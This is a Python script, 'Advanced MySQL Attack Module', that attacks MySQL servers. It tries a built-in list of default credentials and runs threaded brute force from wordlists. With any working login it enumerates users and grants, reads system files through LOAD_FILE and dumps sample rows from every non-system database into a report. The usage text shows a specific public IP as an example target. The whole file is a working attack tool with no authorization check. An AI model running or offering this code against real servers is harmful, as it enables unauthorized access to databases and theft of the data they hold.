#!/usr/bin/env python3
"""
Advanced MySQL Attack Module v1.0
Comprehensive MySQL exploitation toolkit for security testing
Works with URLs, domains, and IP addresses
"""

import argparse
import sys
import socket
import time
from typing import List, Dict, Tuple, Optional
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor, as_completed
import json
from datetime import datetime
from urllib.parse import urlparse

try:
    import pymysql
    pymysql.install_as_MySQLdb()
except ImportError:
    print("[!] Error: pymysql not installed")
    print("[*] Install: pip install pymysql")
    sys.exit(1)


@dataclass
class MySQLTarget:
    """MySQL target information"""
    host: str
    port: int = 3306
    timeout: int = 5
    
    @staticmethod
    def from_url(target: str, port: int = 3306) -> 'MySQLTarget':
        """Create MySQLTarget from URL, domain, or IP"""
        if target.startswith(('http://', 'https://', 'mysql://')):
            parsed = urlparse(target)
            host = parsed.netloc.split(':')[0] if parsed.netloc else parsed.path
            port = parsed.port if parsed.port else port
        else:
            # Plain domain or IP, might have port
            if ':' in target:
                host, port_str = target.rsplit(':', 1)
                port = int(port_str) if port_str.isdigit() else port
            else:
                host = target
        
        return MySQLTarget(host=host, port=port)


@dataclass
class MySQLCredential:
    """MySQL credential pair"""
    username: str
    password: str


@dataclass
class MySQLVulnerability:
    """MySQL vulnerability finding"""
    severity: str
    type: str
    details: str
    credential: Optional[MySQLCredential] = None
    data: Optional[Dict] = None


class MySQLAttacker:
    """Advanced MySQL attack toolkit"""
    
    # Common MySQL default credentials
    DEFAULT_CREDENTIALS = [
        ('root', ''),
        ('root', 'root'),
        ('root', 'password'),
        ('root', 'toor'),
        ('root', 'admin'),
        ('root', 'mysql'),
        ('root', '123456'),
        ('root', 'pass'),
        ('admin', 'admin'),
        ('admin', 'password'),
        ('mysql', 'mysql'),
        ('test', 'test'),
        ('user', 'user'),
        ('guest', 'guest'),
        ('dbuser', 'dbuser'),
    ]
    
    # Information gathering queries
    INFO_QUERIES = {
        'version': 'SELECT @@version',
        'hostname': 'SELECT @@hostname',
        'datadir': 'SELECT @@datadir',
        'basedir': 'SELECT @@basedir',
        'tmpdir': 'SELECT @@tmpdir',
        'plugin_dir': 'SELECT @@plugin_dir',
        'secure_file_priv': "SELECT @@global.secure_file_priv",
        'current_user': 'SELECT CURRENT_USER()',
        'system_user': 'SELECT SYSTEM_USER()',
        'session_user': 'SELECT SESSION_USER()',
    }
    
    def __init__(self, target: MySQLTarget, verbose: bool = False):
        self.target = target
        self.verbose = verbose
        self.vulnerabilities: List[MySQLVulnerability] = []
        
    def log(self, message: str, level: str = "INFO"):
        """Log message with timestamp"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        prefix = {
            "INFO": "[*]",
            "SUCCESS": "[+]",
            "ERROR": "[!]",
            "WARNING": "[!]",
            "DEBUG": "[~]"
        }.get(level, "[*]")
        
        color = {
            "SUCCESS": "\033[92m",
            "ERROR": "\033[91m",
            "WARNING": "\033[93m",
            "INFO": "\033[94m",
            "DEBUG": "\033[90m"
        }.get(level, "")
        
        reset = "\033[0m" if color else ""
        print(f"{color}{prefix} [{timestamp}] {message}{reset}")
        
    def check_port_open(self) -> bool:
        """Check if MySQL port is accessible"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.target.timeout)
            result = sock.connect_ex((self.target.host, self.target.port))
            sock.close()
            return result == 0
        except Exception as e:
            if self.verbose:
                self.log(f"Port check error: {e}", "DEBUG")
            return False
    
    def test_connection(self, username: str, password: str) -> Tuple[bool, Optional[pymysql.connections.Connection]]:
        """Test MySQL connection with credentials"""
        try:
            conn = pymysql.connect(
                host=self.target.host,
                port=self.target.port,
                user=username,
                password=password,
                connect_timeout=self.target.timeout,
                read_timeout=self.target.timeout,
                charset='utf8mb4'
            )
            return True, conn
        except pymysql.Error as e:
            if self.verbose:
                self.log(f"Auth failed for {username}:{password} - {e}", "DEBUG")
            return False, None
        except Exception as e:
            if self.verbose:
                self.log(f"Connection error: {e}", "DEBUG")
            return False, None
    
    def brute_force_single(self, username: str, password: str) -> Optional[MySQLCredential]:
        """Test a single credential pair"""
        success, conn = self.test_connection(username, password)
        if success:
            conn.close()
            return MySQLCredential(username, password)
        return None
    
    def brute_force_attack(self, usernames: List[str], passwords: List[str], 
                          threads: int = 5) -> List[MySQLCredential]:
        """Brute force MySQL authentication"""
        self.log(f"Starting brute force attack with {len(usernames)} users and {len(passwords)} passwords")
        
        valid_creds = []
        total = len(usernames) * len(passwords)
        tested = 0
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for username in usernames:
                for password in passwords:
                    future = executor.submit(self.brute_force_single, username, password)
                    futures.append(future)
            
            for future in as_completed(futures):
                tested += 1
                if tested % 50 == 0 or tested == total:
                    self.log(f"Progress: {tested}/{total} ({tested*100//total}%)", "DEBUG")
                
                result = future.result()
                if result:
                    self.log(f"Valid credentials found: {result.username}:{result.password}", "SUCCESS")
                    valid_creds.append(result)
                    
                    # Add vulnerability
                    vuln = MySQLVulnerability(
                        severity="CRITICAL",
                        type="Weak Credentials",
                        details=f"MySQL accepts weak credentials: {result.username}:{result.password}",
                        credential=result
                    )
                    self.vulnerabilities.append(vuln)
        
        return valid_creds
    
    def test_default_credentials(self) -> List[MySQLCredential]:
        """Test common default credentials"""
        self.log("Testing default credentials...")
        valid_creds = []
        
        for username, password in self.DEFAULT_CREDENTIALS:
            if self.verbose:
                self.log(f"Testing {username}:{password if password else '(empty)'}", "DEBUG")
            
            success, conn = self.test_connection(username, password)
            if success:
                conn.close()
                cred = MySQLCredential(username, password)
                valid_creds.append(cred)
                self.log(f"DEFAULT CREDENTIALS FOUND: {username}:{password if password else '(empty)'}", "SUCCESS")
                
                vuln = MySQLVulnerability(
                    severity="CRITICAL",
                    type="Default Credentials",
                    details=f"MySQL using default credentials: {username}:{password if password else '(empty)'}",
                    credential=cred
                )
                self.vulnerabilities.append(vuln)
        
        if not valid_creds:
            self.log("No default credentials found", "INFO")
        
        return valid_creds
    
    def gather_information(self, conn: pymysql.connections.Connection) -> Dict:
        """Gather MySQL server information"""
        self.log("Gathering server information...")
        info = {}
        
        try:
            cursor = conn.cursor()
            
            # Basic info queries
            for key, query in self.INFO_QUERIES.items():
                try:
                    cursor.execute(query)
                    result = cursor.fetchone()
                    info[key] = result[0] if result else None
                    if result and self.verbose:
                        self.log(f"{key}: {result[0]}", "DEBUG")
                except pymysql.Error as e:
                    info[key] = f"Error: {e}"
            
            # List databases
            try:
                cursor.execute("SHOW DATABASES")
                databases = [row[0] for row in cursor.fetchall()]
                info['databases'] = databases
                self.log(f"Databases found: {len(databases)}", "SUCCESS")
                if self.verbose:
                    for db in databases:
                        self.log(f"  - {db}", "DEBUG")
            except pymysql.Error as e:
                info['databases'] = f"Error: {e}"
            
            # List users
            try:
                cursor.execute("SELECT user, host FROM mysql.user")
                users = [(row[0], row[1]) for row in cursor.fetchall()]
                info['users'] = users
                self.log(f"Users found: {len(users)}", "SUCCESS")
                if self.verbose:
                    for user, host in users:
                        self.log(f"  - {user}@{host}", "DEBUG")
            except pymysql.Error as e:
                info['users'] = f"Error: {e}"
            
            # Check privileges
            try:
                cursor.execute("SHOW GRANTS")
                grants = [row[0] for row in cursor.fetchall()]
                info['grants'] = grants
                
                # Check for dangerous privileges
                dangerous_privs = ['FILE', 'SUPER', 'PROCESS', 'RELOAD', 'SHUTDOWN']
                found_dangerous = []
                
                for grant in grants:
                    for priv in dangerous_privs:
                        if priv in grant.upper():
                            found_dangerous.append(priv)
                
                if found_dangerous:
                    self.log(f"Dangerous privileges found: {', '.join(set(found_dangerous))}", "WARNING")
                    vuln = MySQLVulnerability(
                        severity="HIGH",
                        type="Excessive Privileges",
                        details=f"User has dangerous privileges: {', '.join(set(found_dangerous))}",
                        data={'privileges': found_dangerous}
                    )
                    self.vulnerabilities.append(vuln)
                    
            except pymysql.Error as e:
                info['grants'] = f"Error: {e}"
            
            # Check global variables
            try:
                cursor.execute("SHOW GLOBAL VARIABLES LIKE '%version%'")
                variables = {row[0]: row[1] for row in cursor.fetchall()}
                info['version_variables'] = variables
            except pymysql.Error as e:
                info['version_variables'] = f"Error: {e}"
            
            cursor.close()
            
        except Exception as e:
            self.log(f"Error gathering information: {e}", "ERROR")
        
        return info
    
    def test_file_privileges(self, conn: pymysql.connections.Connection) -> bool:
        """Test if user has FILE privilege"""
        self.log("Testing FILE privilege...")
        
        try:
            cursor = conn.cursor()
            
            # Try to read /etc/hostname (usually readable)
            test_queries = [
                "SELECT LOAD_FILE('/etc/hostname')",
                "SELECT LOAD_FILE('/etc/hosts')",
                "SELECT LOAD_FILE('C:/Windows/System32/drivers/etc/hosts')",  # Windows
            ]
            
            for query in test_queries:
                try:
                    cursor.execute(query)
                    result = cursor.fetchone()
                    if result and result[0]:
                        self.log(f"FILE privilege confirmed - can read system files!", "WARNING")
                        vuln = MySQLVulnerability(
                            severity="CRITICAL",
                            type="FILE Privilege Enabled",
                            details="User has FILE privilege - can read/write system files",
                            data={'test_query': query, 'result': str(result[0])[:100]}
                        )
                        self.vulnerabilities.append(vuln)
                        cursor.close()
                        return True
                except pymysql.Error:
                    continue
            
            cursor.close()
            self.log("FILE privilege not available or restricted", "INFO")
            return False
            
        except Exception as e:
            self.log(f"Error testing FILE privilege: {e}", "ERROR")
            return False
    
    def enumerate_tables(self, conn: pymysql.connections.Connection, database: str) -> List[str]:
        """Enumerate tables in a database"""
        try:
            cursor = conn.cursor()
            cursor.execute(f"USE `{database}`")
            cursor.execute("SHOW TABLES")
            tables = [row[0] for row in cursor.fetchall()]
            cursor.close()
            return tables
        except Exception as e:
            if self.verbose:
                self.log(f"Error enumerating tables in {database}: {e}", "DEBUG")
            return []
    
    def dump_table_sample(self, conn: pymysql.connections.Connection, 
                         database: str, table: str, limit: int = 5) -> List[Dict]:
        """Dump sample data from table"""
        try:
            cursor = conn.cursor()
            cursor.execute(f"USE `{database}`")
            cursor.execute(f"SELECT * FROM `{table}` LIMIT {limit}")
            
            # Get column names
            columns = [desc[0] for desc in cursor.description]
            
            # Fetch data
            rows = cursor.fetchall()
            data = []
            for row in rows:
                data.append(dict(zip(columns, row)))
            
            cursor.close()
            return data
        except Exception as e:
            if self.verbose:
                self.log(f"Error dumping table {database}.{table}: {e}", "DEBUG")
            return []
    
    def full_enumeration(self, conn: pymysql.connections.Connection) -> Dict:
        """Full database enumeration"""
        self.log("Starting full database enumeration...")
        
        enum_data = {
            'databases': {},
            'total_tables': 0,
            'total_records_sampled': 0
        }
        
        try:
            cursor = conn.cursor()
            cursor.execute("SHOW DATABASES")
            databases = [row[0] for row in cursor.fetchall()]
            cursor.close()
            
            # Skip system databases for quick scan
            skip_dbs = ['information_schema', 'performance_schema', 'mysql', 'sys']
            
            for db in databases:
                if db in skip_dbs:
                    continue
                
                self.log(f"Enumerating database: {db}", "INFO")
                tables = self.enumerate_tables(conn, db)
                
                enum_data['databases'][db] = {
                    'table_count': len(tables),
                    'tables': {}
                }
                enum_data['total_tables'] += len(tables)
                
                # Sample first 3 tables only for speed
                for table in tables[:3]:
                    if self.verbose:
                        self.log(f"  Sampling table: {table}", "DEBUG")
                    
                    sample_data = self.dump_table_sample(conn, db, table, limit=3)
                    enum_data['databases'][db]['tables'][table] = {
                        'sample_rows': len(sample_data),
                        'sample_data': sample_data
                    }
                    enum_data['total_records_sampled'] += len(sample_data)
                
                if len(tables) > 3:
                    enum_data['databases'][db]['tables']['_truncated'] = f"{len(tables) - 3} more tables not sampled"
            
            self.log(f"Enumeration complete: {len(enum_data['databases'])} databases, {enum_data['total_tables']} tables", "SUCCESS")
            
        except Exception as e:
            self.log(f"Error during enumeration: {e}", "ERROR")
        
        return enum_data
    
    def generate_report(self, output_file: str = None) -> Dict:
        """Generate comprehensive report"""
        report = {
            'target': {
                'host': self.target.host,
                'port': self.target.port
            },
            'scan_time': datetime.now().isoformat(),
            'vulnerabilities': [],
            'summary': {
                'total_vulnerabilities': len(self.vulnerabilities),
                'critical': 0,
                'high': 0,
                'medium': 0,
                'low': 0
            }
        }
        
        for vuln in self.vulnerabilities:
            vuln_dict = {
                'severity': vuln.severity,
                'type': vuln.type,
                'details': vuln.details
            }
            
            if vuln.credential:
                vuln_dict['credential'] = {
                    'username': vuln.credential.username,
                    'password': vuln.credential.password
                }
            
            if vuln.data:
                vuln_dict['data'] = vuln.data
            
            report['vulnerabilities'].append(vuln_dict)
            
            # Count by severity
            severity = vuln.severity.upper()
            if severity == 'CRITICAL':
                report['summary']['critical'] += 1
            elif severity == 'HIGH':
                report['summary']['high'] += 1
            elif severity == 'MEDIUM':
                report['summary']['medium'] += 1
            else:
                report['summary']['low'] += 1
        
        if output_file:
            with open(output_file, 'w') as f:
                json.dump(report, f, indent=2, default=str)
            self.log(f"Report saved to: {output_file}", "SUCCESS")
        
        return report
    
    def run_comprehensive_attack(self, test_defaults: bool = True, 
                                brute_force: bool = False,
                                usernames: List[str] = None,
                                passwords: List[str] = None,
                                enumerate: bool = True) -> Dict:
        """Run comprehensive MySQL attack"""
        
        self.log(f"Starting MySQL attack against {self.target.host}:{self.target.port}")
        self.log("="*60)
        
        # Check if port is open
        self.log("Checking if MySQL port is accessible...")
        if not self.check_port_open():
            self.log(f"Port {self.target.port} is not accessible", "ERROR")
            return {'error': 'Port not accessible'}
        
        self.log(f"Port {self.target.port} is OPEN", "SUCCESS")
        
        # Test default credentials
        valid_creds = []
        if test_defaults:
            valid_creds = self.test_default_credentials()
        
        # Brute force attack
        if brute_force and usernames and passwords:
            brute_creds = self.brute_force_attack(usernames, passwords)
            valid_creds.extend(brute_creds)
        
        # If we have valid credentials, enumerate
        if valid_creds and enumerate:
            self.log("="*60)
            self.log("CREDENTIALS FOUND - Starting enumeration", "SUCCESS")
            
            cred = valid_creds[0]  # Use first valid credential
            success, conn = self.test_connection(cred.username, cred.password)
            
            if success:
                # Gather information
                info = self.gather_information(conn)
                
                # Test FILE privilege
                self.test_file_privileges(conn)
                
                # Full enumeration
                enum_data = self.full_enumeration(conn)
                
                conn.close()
                
                return {
                    'valid_credentials': [(c.username, c.password) for c in valid_creds],
                    'server_info': info,
                    'enumeration': enum_data,
                    'vulnerabilities': self.vulnerabilities
                }
        
        return {
            'valid_credentials': [(c.username, c.password) for c in valid_creds],
            'vulnerabilities': self.vulnerabilities
        }


def main():
    parser = argparse.ArgumentParser(
        description='Advanced MySQL Attack Module v1.0 - Works with URLs, domains, and IPs',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Test default credentials - IP
  python3 mysql_attack.py 64.31.47.162
  
  # Test with URL
  python3 mysql_attack.py mysql://example.com
  python3 mysql_attack.py https://example.com --port 3306
  
  # Full enumeration if credentials found
  python3 mysql_attack.py example.com --enumerate
  
  # Brute force attack
  python3 mysql_attack.py example.com --brute-force -U usernames.txt -P passwords.txt
  
  # Custom port
  python3 mysql_attack.py example.com --port 3307
  
  # Save report
  python3 mysql_attack.py example.com -o mysql_report.json
        """
    )
    
    parser.add_argument('host', help='Target MySQL host, URL, domain, or IP')
    parser.add_argument('--port', type=int, default=3306, help='MySQL port (default: 3306)')
    parser.add_argument('--timeout', type=int, default=5, help='Connection timeout (default: 5)')
    parser.add_argument('--no-defaults', action='store_true', help='Skip default credential test')
    parser.add_argument('--brute-force', action='store_true', help='Enable brute force attack')
    parser.add_argument('-U', '--usernames', help='File with usernames (one per line)')
    parser.add_argument('-P', '--passwords', help='File with passwords (one per line)')
    parser.add_argument('--threads', type=int, default=5, help='Threads for brute force (default: 5)')
    parser.add_argument('--enumerate', action='store_true', help='Full database enumeration')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-o', '--output', help='Output JSON report file')
    
    args = parser.parse_args()
    
    # Create target with URL support
    target = MySQLTarget.from_url(args.host, args.port)
    
    print(f"\n🗄️  MySQL Attack Module")
    print(f"Target: {args.host}")
    print(f"Host: {target.host}:{target.port}\n")
    
    # Create attacker
    attacker = MySQLAttacker(target, verbose=args.verbose)
    
    # Load username/password lists if provided
    usernames = []
    passwords = []
    
    if args.brute_force:
        if not args.usernames or not args.passwords:
            print("[!] Brute force requires -U and -P arguments")
            sys.exit(1)
        
        try:
            with open(args.usernames) as f:
                usernames = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"[!] Error reading usernames: {e}")
            sys.exit(1)
        
        try:
            with open(args.passwords) as f:
                passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"[!] Error reading passwords: {e}")
            sys.exit(1)
    
    # Run attack
    try:
        results = attacker.run_comprehensive_attack(
            test_defaults=not args.no_defaults,
            brute_force=args.brute_force,
            usernames=usernames,
            passwords=passwords,
            enumerate=args.enumerate
        )
        
        # Generate report
        print("\n" + "="*60)
        print("SCAN COMPLETE")
        print("="*60)
        
        if 'error' in results:
            print(f"[!] Error: {results['error']}")
        else:
            print(f"[+] Vulnerabilities found: {len(attacker.vulnerabilities)}")
            
            if results.get('valid_credentials'):
                print(f"[+] Valid credentials: {len(results['valid_credentials'])}")
                for user, pwd in results['valid_credentials']:
                    print(f"    - {user}:{pwd if pwd else '(empty)'}")
            
            if args.output:
                attacker.generate_report(args.output)
        
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Fatal error: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == '__main__':
    main()
